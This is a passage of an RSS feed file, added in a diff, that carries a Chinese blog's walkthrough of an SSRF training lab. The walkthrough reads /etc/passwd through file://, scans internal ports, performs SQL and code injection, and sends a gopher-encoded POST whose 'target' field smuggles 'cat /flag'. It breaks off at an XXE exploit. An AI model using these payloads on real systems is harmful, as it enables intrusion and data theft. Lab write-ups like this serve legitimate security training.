@@ -1,0 +1,904 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WEB安全 on PDZL</title><link>https://pdzl.github.io/categories/web%E5%AE%89%E5%85%A8/</link><description>Recent content in WEB安全 on PDZL</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>PDZL</copyright><lastBuildDate>Wed, 01 Oct 2025 20:28:30 +0800</lastBuildDate><atom:link href="https://pdzl.github.io/categories/web%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml"/><item><title>SSRF靶场</title><link>https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/</link><pubDate>Wed, 01 Oct 2025 20:28:30 +0800</pubDate><guid>https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/</guid><description>&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/SSRF.png" alt="Featured image of post SSRF靶场" /&gt;&lt;h2 id="环境准备"&gt;环境准备
+&lt;/h2&gt;&lt;p&gt;靶场来源：&lt;a class="link" href="https://github.com/ProbiusOfficial/ssrf-labs" target="_blank" rel="noopener"
+&gt;靶场&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;下载后解压界面如下&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002003142401.png"
+width="882"
+height="521"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002003142401_hu_50628ece9b37a110.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002003142401_hu_94cea2418ec969d.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="169"
+data-flex-basis="406px"
+&gt;&lt;/p&gt;
+&lt;p&gt;输入&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;docker compose up -d
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002003450234.png"
+width="728"
+height="660"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002003450234_hu_31af016a42c01c4a.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002003450234_hu_cd3dcff12ed8e4cf.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="110"
+data-flex-basis="264px"
+&gt;&lt;/p&gt;
+&lt;p&gt;成功运行&lt;/p&gt;
+&lt;p&gt;输入&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;docker ps
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;查看映射到物理机的端口&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002003736740.png"
+width="725"
+height="664"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002003736740_hu_7f8ccb45776a05ba.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002003736740_hu_dd57d85cec7e2f7c.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="109"
+data-flex-basis="262px"
+&gt;&lt;/p&gt;
+&lt;p&gt;可知要访问8880端口&lt;/p&gt;
+&lt;p&gt;通过ifconfig可知虚拟机ip&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002003917091.png"
+width="729"
+height="227"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002003917091_hu_e23eb0b053c895dc.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002003917091_hu_5b1c5ed53875dd8c.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="321"
+data-flex-basis="770px"
+&gt;&lt;/p&gt;
+&lt;p&gt;通过访问该ip:8880进入SSRF靶场&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002004052976.png"
+width="1838"
+height="952"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002004052976_hu_a8e87451f85f910e.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002004052976_hu_c020026f8904d11b.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="193"
+data-flex-basis="463px"
+&gt;&lt;/p&gt;
+&lt;h2 id="判断ssrf是否存在"&gt;判断SSRF是否存在
+&lt;/h2&gt;&lt;p&gt;能够对外发起网络请求的地方，就可能存在 SSRF。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002004525169.png"
+width="1589"
+height="1001"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002004525169_hu_2859602d406f702.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002004525169_hu_a1573ad7a2f18402.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="158"
+data-flex-basis="380px"
+&gt;&lt;/p&gt;
+&lt;p&gt;由图可知该站点存在SSRF。&lt;/p&gt;
+&lt;h2 id="ssrf-获取本地信息"&gt;SSRF 获取本地信息
+&lt;/h2&gt;&lt;h3 id="file-协议获取本地信息"&gt;FILE 协议获取本地信息
+&lt;/h3&gt;&lt;p&gt;既然当前站点存在 SSRF 的话，我们可以尝试配合 file 协议来读取本地的文件信息，首先尝试使用 file 协议来读取 /etc/passwd 文件试试看：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;file:///etc/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002010027622.png"
+width="792"
+height="383"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002010027622_hu_5cfb6126eb38b8d3.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002010027622_hu_900f12b95485f3eb.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="206"
+data-flex-basis="496px"
+&gt;&lt;/p&gt;
+&lt;p&gt;成功读取到了本地的文件信息，现在尝试来获取存在 SSRF 漏洞的本机内网 IP 地址信息，确认当前资产的网段信息：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;file:///etc/hosts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002010153530.png"
+width="746"
+height="375"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002010153530_hu_87690c94d8eb3a8e.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002010153530_hu_b2e674907f879c47.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="198"
+data-flex-basis="477px"
+&gt;&lt;/p&gt;
+&lt;h2 id="ssrf-探测内网端口"&gt;SSRF 探测内网端口
+&lt;/h2&gt;&lt;p&gt;SSRF 常配合 DICT 协议探测内网端口开放情况&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002143045721.png"
+width="866"
+height="632"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002143045721_hu_f6ba141717aa04dc.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002143045721_hu_f9aed7885390bbba.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="137"
+data-flex-basis="328px"
+&gt;&lt;/p&gt;
+&lt;p&gt;通过BurpSuit抓包爆破知道内网端口开放情况&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002143225857.png"
+width="1315"
+height="487"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002143225857_hu_80d5361fa71858db.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002143225857_hu_dff689867d296c15.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="270"
+data-flex-basis="648px"
+&gt;&lt;/p&gt;
+&lt;p&gt;通过爆破可以整理出端口的开放情况：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002145834006.png"
+width="1551"
+height="273"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002145834006_hu_401146f007cc2858.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002145834006_hu_54b0cc55344da8bc.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="568"
+data-flex-basis="1363px"
+&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;span class="lnt"&gt;8
+&lt;/span&gt;&lt;span class="lnt"&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;172.72.23.21 - 80
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;172.72.23.22 - 80
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;172.72.23.23 - 80，3306
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;172.72.23.24 - 80
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;172.72.23.25 - 80
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;172.72.23.26 - 8080
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;172.72.23.27 - 6379
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;172.72.23.28 - 6379，80
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;172.72.23.29 - 3306
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="代码注入"&gt;代码注入
+&lt;/h2&gt;&lt;h3 id="代码注入应用详情"&gt;代码注入应用详情
+&lt;/h3&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002151002644.png"
+width="770"
+height="236"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002151002644_hu_15cd8c952a2ae44e.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002151002644_hu_debadfaff949815b.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="326"
+data-flex-basis="783px"
+&gt;&lt;/p&gt;
+&lt;p&gt;可知有两个文件index.php和shell.php&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002151046401.png"
+width="793"
+height="615"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002151046401_hu_396e8ccc1b3e88b2.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002151046401_hu_d83ed35825357d20.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="128"
+data-flex-basis="309px"
+&gt;&lt;/p&gt;
+&lt;p&gt;将回显的代码写入html文件&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002151119290.png"
+width="198"
+height="203"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002151119290_hu_98165262ecef29ed.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002151119290_hu_2b6a7862ed60a007.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="97"
+data-flex-basis="234px"
+&gt;&lt;/p&gt;
+&lt;p&gt;由此可知能通过cmd这个注入点进行代码注入&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002151509241.png"
+width="757"
+height="899"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002151509241_hu_5d9809babf4bb532.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002151509241_hu_f4d6ef07e530d96b.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="84"
+data-flex-basis="202px"
+&gt;&lt;/p&gt;
+&lt;p&gt;取得flag：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;helloct{you_got_flag_22}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002152333776.png"
+width="764"
+height="631"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002152333776_hu_87df0a34c4e521a3.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002152333776_hu_43ddbc712f2388a9.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="121"
+data-flex-basis="290px"
+&gt;&lt;/p&gt;
+&lt;h2 id="sql-注入"&gt;SQL 注入
+&lt;/h2&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002152648093.png"
+width="775"
+height="246"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002152648093_hu_9aff006ba78104f1.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002152648093_hu_601477ea92bc2925.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="315"
+data-flex-basis="756px"
+&gt;&lt;/p&gt;
+&lt;p&gt;可知该关所用数据库为MariaDB，注入点为id&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002154437739.png"
+width="747"
+height="241"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002154437739_hu_895e75f26f2f673d.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002154437739_hu_428f021552ab3a78.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="309"
+data-flex-basis="743px"
+&gt;&lt;/p&gt;
+&lt;p&gt;可知存在数字型SQL注入，显示位有三位&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002155010440.png"
+width="743"
+height="394"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002155010440_hu_4841a5bae8bf3143.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002155010440_hu_93995133f59fd8b4.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="188"
+data-flex-basis="452px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002154942361.png"
+width="773"
+height="402"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002154942361_hu_2ad5f933bf2837d8.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002154942361_hu_d1c70abd9e79acd2.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="192"
+data-flex-basis="461px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002155046784.png"
+width="758"
+height="380"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002155046784_hu_23dd6a38d5a209de.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002155046784_hu_be57595fc7df5c05.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="199"
+data-flex-basis="478px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002155130160.png"
+width="757"
+height="397"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002155130160_hu_7429daab75b9146c.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002155130160_hu_dfef134deaabde69.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="190"
+data-flex-basis="457px"
+&gt;&lt;/p&gt;
+&lt;p&gt;通过爆库，爆表，爆段，爆数据后得到flag：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;helloct{you_got_flag_23}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="命令执行"&gt;命令执行
+&lt;/h2&gt;&lt;h3 id="命令执行应用详情"&gt;命令执行应用详情
+&lt;/h3&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002165412628.png"
+width="599"
+height="475"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002165412628_hu_96632b487feb2344.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002165412628_hu_fcda1fa0228b86a2.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="126"
+data-flex-basis="302px"
+&gt;&lt;/p&gt;
+&lt;p&gt;可知该关要通过POST上传参数，想到使用gopher协议&lt;/p&gt;
+&lt;h3 id="ssrf-之命令执行"&gt;SSRF 之命令执行
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;POST /ping.php HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host: 172.72.23.24
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Content-Length: 24
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Cache-Control: max-age=0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Content-Type: application/x-www-form-urlencoded
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Upgrade-Insecure-Requests: 1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Referer: http://core.hello-ctf.com:8011/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Connection: close
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;target=1.1.1.1;cat /flag
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;将上诉数据进行两次url编码然后拼接到&lt;code&gt;gopher://172.72.23.24:80/_&lt;/code&gt;后&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002170201724.png"
+width="1196"
+height="701"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002170201724_hu_1d1ac7708c699e19.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002170201724_hu_61d703521ce7e4d0.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="170"
+data-flex-basis="409px"
+&gt;&lt;/p&gt;
+&lt;p&gt;得到flag：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;helloct{you_got_flag_24)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="xml-实体注入"&gt;XML 实体注入
+&lt;/h2&gt;&lt;h3 id="xxe-应用详情"&gt;XXE 应用详情
+&lt;/h3&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002172153847.png"
+width="731"
+height="294"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002172153847_hu_850911b1e4d616d4.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251002172153847_hu_a3cac31d2cfbea29.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="248"
+data-flex-basis="596px"
+&gt;&lt;/p&gt;
+&lt;p&gt;通过上图可知该关存在XXE漏洞&lt;/p&gt;
+&lt;h3 id="xxe攻击"&gt;XXE攻击
+&lt;/h3&gt;&lt;p&gt;EXP:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
